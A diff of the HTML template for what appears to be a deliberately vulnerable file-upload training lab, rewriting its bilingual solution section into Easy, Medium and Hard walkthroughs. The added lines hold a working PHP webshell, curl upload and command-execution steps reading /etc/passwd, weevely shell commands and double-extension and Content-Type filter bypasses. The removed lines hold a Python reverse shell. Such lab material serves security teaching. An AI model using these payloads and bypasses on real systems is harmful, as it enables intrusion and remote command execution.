@@ -85,22 +85,24 @@
         </svg>
       </div>
       <div>
-        <p class="font-bold text-sm text-gray-900 dark:text-white">Eliminar archivo</p>
-        <p class="text-xs text-gray-500 dark:text-gray-400 mt-0.5">Esta acción no se puede deshacer</p>
+        <p class="font-bold text-sm text-gray-900 dark:text-white" data-i18n="upload_del_title">Eliminar archivo</p>
+        <p class="text-xs text-gray-500 dark:text-gray-400 mt-0.5" data-i18n="upload_del_irrev">Esta acción no se puede deshacer</p>
       </div>
     </div>
     <p class="text-sm text-gray-600 dark:text-gray-300 mb-5">
-      ¿Eliminar <span id="confirm-filename" class="font-mono font-bold" style="color:var(--hl-primary)"></span>?
+      <span data-i18n="upload_del_confirm">¿Eliminar</span> <span id="confirm-filename" class="font-mono font-bold" style="color:var(--hl-primary)"></span>?
     </p>
     <div class="flex gap-2 justify-end">
       <button onclick="cancelDeleteAction()" type="button"
               class="text-sm px-4 py-1.5 rounded-lg transition"
-              style="border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.05);cursor:pointer;color:inherit">
+              style="border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.05);cursor:pointer;color:inherit"
+              data-i18n="upload_del_cancel">
         Cancelar
       </button>
       <button onclick="confirmDeleteAction()" type="button"
               class="text-sm px-4 py-1.5 rounded-lg font-semibold transition"
-              style="background:#ef4444;border:none;color:#fff;cursor:pointer">
+              style="background:#ef4444;border:none;color:#fff;cursor:pointer"
+              data-i18n="upload_del_ok">
         Eliminar
       </button>
     </div>
@@ -109,69 +111,120 @@
 
 <div id="resolution-data" class="hidden">
   <div class="lang-content" data-lang="es">
-    <h3>Pasos de explotación</h3>
+    <h3>Easy — Sin restricciones</h3>
+    <p>El servidor acepta cualquier extensión. Sube directamente una webshell PHP.</p>
     <ol>
-      <li>El servidor acepta cualquier tipo de archivo sin validar extensión ni content-type.</li>
-      <li>Crea una webshell PHP:</li>
+      <li>Crea la webshell:</li>
     </ol>
-      <h3>Pasos de explotación</h3>
-      <ol>
-        <li>El servidor acepta archivos y puede ejecutarlos como Python o PHP según la extensión y dificultad.</li>
-        <li><b>Ejemplo de payload Python (reverse shell):</b></li>
-      </ol>
-      <pre>import os,socket,subprocess
-  s=socket.socket()
-  s.connect(("127.0.0.1",4444))
-  os.dup2(s.fileno(),0)
-  os.dup2(s.fileno(),1)
-  os.dup2(s.fileno(),2)
-  subprocess.call(["/bin/sh","-i"])
-  # Guarda como shell.py y sube el archivo</pre>
-      <ol start="3">
-        <li><b>Ejemplo de payload PHP (webshell):</b></li>
-      </ol>
-      <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;
-    # Guarda como shell.php y sube el archivo
-    # Accede a /uploads/shell.php?cmd=id para probar</pre>
-      <ol start="4">
-        <li>Sube el archivo mediante el formulario o con curl:</li>
-      </ol>
-      <pre>curl -F "file=@shell.php" http://localhost:5000/upload
-  curl -F "file=@shell.py" http://localhost:5000/upload</pre>
-      <ol start="5">
-        <li>Para webshell PHP, accede a <code>/uploads/shell.php?cmd=id</code> o el comando que desees.</li>
-      </ol>
-      <pre>curl "http://localhost:5000/uploads/shell.php?cmd=id"
-  curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"</pre>
-      <ol start="6">
-        <li>También puedes subir un archivo <code>.html</code> para XSS, o un EXE para phishing.</li>
-        <li>Para una shell interactiva, usa <strong>weevely</strong>: <code>weevely generate password shell.php</code></li>
-      </ol>
-      <h3>Herramientas</h3>
-      <div><span class="tools-badge">curl</span> <span class="tools-badge">weevely</span> <span class="tools-badge">msfvenom</span> <span class="tools-badge">Burp Suite</span></div>
-  </div>
-  <div class="lang-content" data-lang="en" style="display:none">
-    <h3>Exploitation Steps</h3>
-    <ol>
-      <li>The server accepts any file type without validating extension or content-type.</li>
-      <li>Create a PHP webshell:</li>
-    </ol>
-    <pre>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php</pre>
-    <ol start="3">
-      <li>Upload it via the form or with curl:</li>
+    <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;</pre>
+    <ol start="2">
+      <li>Guárdala como <code>shell.php</code> y súbela por el formulario, o con curl:</li>
     </ol>
     <pre>curl -F "file=@shell.php" http://localhost:5000/upload</pre>
-    <ol start="4">
-      <li>Access and execute commands:</li>
+    <ol start="3">
+      <li>Ejecuta comandos:</li>
     </ol>
     <pre>curl "http://localhost:5000/uploads/shell.php?cmd=id"
 curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"</pre>
-    <ol start="5">
-      <li>You can also upload an <code>.html</code> for stored XSS, or an EXE for phishing.</li>
-      <li>For an interactive shell, use <strong>weevely</strong>: <code>weevely generate password shell.php</code></li>
+    <ol start="4">
+      <li>Para una shell interactiva genera una webshell con weevely:</li>
     </ol>
+    <pre>weevely generate password shell.php
+curl -F "file=@shell.php" http://localhost:5000/upload
+weevely http://localhost:5000/uploads/shell.php password</pre>
+
+    <h3>Medium — Blacklist bypass (doble extensión)</h3>
+    <p>El servidor bloquea <code>.php</code>, <code>.py</code>, <code>.sh</code>, etc. por extensión final, pero permite doble extensión como <code>.php.jpg</code>.</p>
+    <ol>
+      <li>Renombra tu webshell con doble extensión:</li>
+    </ol>
+    <pre>cp shell.php shell.php.jpg</pre>
+    <ol start="2">
+      <li>Súbela (el formulario la acepta porque la extensión final es <code>.jpg</code>):</li>
+    </ol>
+    <pre>curl -F "file=@shell.php.jpg" http://localhost:5000/upload</pre>
+    <ol start="3">
+      <li>El servidor la ejecuta como PHP al acceder:</li>
+    </ol>
+    <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"
+curl "http://localhost:5000/uploads/shell.php.jpg?cmd=whoami"</pre>
+
+    <h3>Hard — Whitelist + Content-Type bypass</h3>
+    <p>El servidor valida extensión por whitelist (<code>.jpg</code>, <code>.png</code>, <code>.gif</code>, <code>.pdf</code>, <code>.txt</code>) y Content-Type. El bypass con doble extensión sigue funcionando porque <code>.php.jpg</code> supera ambas comprobaciones.</p>
+    <ol>
+      <li>Prepara la webshell con doble extensión:</li>
+    </ol>
+    <pre>cp shell.php shell.php.jpg</pre>
+    <ol start="2">
+      <li>Súbela forzando el Content-Type a <code>image/jpeg</code> (opcional, el bypass por nombre ya es suficiente):</li>
+    </ol>
+    <pre>curl -F "file=@shell.php.jpg;type=image/jpeg" http://localhost:5000/upload</pre>
+    <ol start="3">
+      <li>Accede y ejecuta comandos igual que en Medium:</li>
+    </ol>
+    <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"
+curl "http://localhost:5000/uploads/shell.php.jpg?cmd=cat+/etc/passwd"</pre>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">weevely</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">msfvenom</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Easy — No restrictions</h3>
+    <p>The server accepts any extension. Upload a PHP webshell directly.</p>
+    <ol>
+      <li>Create the webshell:</li>
+    </ol>
+    <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;</pre>
+    <ol start="2">
+      <li>Save it as <code>shell.php</code> and upload via the form, or with curl:</li>
+    </ol>
+    <pre>curl -F "file=@shell.php" http://localhost:5000/upload</pre>
+    <ol start="3">
+      <li>Execute commands:</li>
+    </ol>
+    <pre>curl "http://localhost:5000/uploads/shell.php?cmd=id"
+curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"</pre>
+    <ol start="4">
+      <li>For an interactive shell, generate one with weevely:</li>
+    </ol>
+    <pre>weevely generate password shell.php
+curl -F "file=@shell.php" http://localhost:5000/upload
+weevely http://localhost:5000/uploads/shell.php password</pre>
+
+    <h3>Medium — Blacklist bypass (double extension)</h3>
+    <p>The server blocks <code>.php</code>, <code>.py</code>, <code>.sh</code>, etc. by final extension, but allows double extensions like <code>.php.jpg</code>.</p>
+    <ol>
+      <li>Rename your webshell with a double extension:</li>
+    </ol>
+    <pre>cp shell.php shell.php.jpg</pre>
+    <ol start="2">
+      <li>Upload it (the form accepts it because the final extension is <code>.jpg</code>):</li>
+    </ol>
+    <pre>curl -F "file=@shell.php.jpg" http://localhost:5000/upload</pre>
+    <ol start="3">
+      <li>The server executes it as PHP when accessed:</li>
+    </ol>
+    <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"
+curl "http://localhost:5000/uploads/shell.php.jpg?cmd=whoami"</pre>
+
+    <h3>Hard — Whitelist + Content-Type bypass</h3>
+    <p>The server validates against a whitelist (<code>.jpg</code>, <code>.png</code>, <code>.gif</code>, <code>.pdf</code>, <code>.txt</code>) and Content-Type. The double-extension bypass still works because <code>.php.jpg</code> passes both checks.</p>
+    <ol>
+      <li>Prepare the webshell with double extension:</li>
+    </ol>
+    <pre>cp shell.php shell.php.jpg</pre>
+    <ol start="2">
+      <li>Upload it forcing Content-Type to <code>image/jpeg</code> (optional — the name bypass is sufficient):</li>
+    </ol>
+    <pre>curl -F "file=@shell.php.jpg;type=image/jpeg" http://localhost:5000/upload</pre>
+    <ol start="3">
+      <li>Access and run commands just like Medium:</li>
+    </ol>
+    <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"
+curl "http://localhost:5000/uploads/shell.php.jpg?cmd=cat+/etc/passwd"</pre>
+
     <h3>Tools</h3>
-    <div><span class="tools-badge">curl</span> <span class="tools-badge">weevely</span> <span class="tools-badge">msfvenom</span> <span class="tools-badge">Burp Suite</span></div>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">weevely</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">msfvenom</span></div>
   </div>
 </div>
 
